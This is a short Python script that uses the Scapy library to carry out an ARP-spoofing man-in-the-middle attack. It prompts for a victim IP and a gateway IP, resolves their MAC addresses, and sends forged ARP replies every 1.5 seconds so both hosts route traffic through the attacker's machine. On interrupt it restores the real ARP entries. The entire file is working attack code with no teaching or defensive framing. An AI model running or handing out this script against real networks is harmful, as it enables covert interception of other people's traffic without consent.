from scapy.all import *
import sys
import os
import time

# function to get the MAC address using IP
def get_mac(IP):
	request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP)
	ans, unans = srp(request, timeout=2, retry=1)
	for sent, recv in ans:
		return recv.hwsrc

# Re Arping with correct MAC address at the end of attack
def reARP():
	print("\n[*] Restoring targets...")
	victimMAC = get_mac(victimIP)
	gateMAC = get_mac(gatewayIP)
	send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 7)
	send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= gateMAC), count = 7) 
	print("\n[*] Shutting Down...")
	sys.exit(1)

# function to send spoofed ARP packets
def spoofer(gm, vm):
	send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = vm))
	send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = gm))

def MITM():
	try:
		# getting victim MAC using victim IP address
		victimMAC = get_mac(victimIP)
	except Exception:
		print("[!] Couldn't find victim MAC address")
		print("[!] Exiting...")

	try:
		# getting gateway MAC address using gateway IP
		gateMAC = get_mac(gatewayIP)
	except Exception:
		print("[!] Couldn't find gateway MAC address")
		print("[!] Exiting...")

	print("[*] ARP Spoofing targets")
	repeat = True
	while repeat:
		try:
			# sending spoofed ARP packets until user stops by pressing Ctrl + C
			spoofer(gateMAC, victimMAC)
			time.sleep(1.5)
		except KeyboardInterrupt:
			# if Ctril + C is pressed - send real ARP packets with correct MAC addresses.
			reARP()
try:
	# getting input for Victim/Router IP from user
	victimIP = input("Enter victim IP: ")
	gatewayIP = input("Enter gateway IP: ")

	MITM()

except KeyboardInterrupt:
	print("\n[*] User Requested Shutdown")
	print("[*] Exiting...")
	sys.exit(1)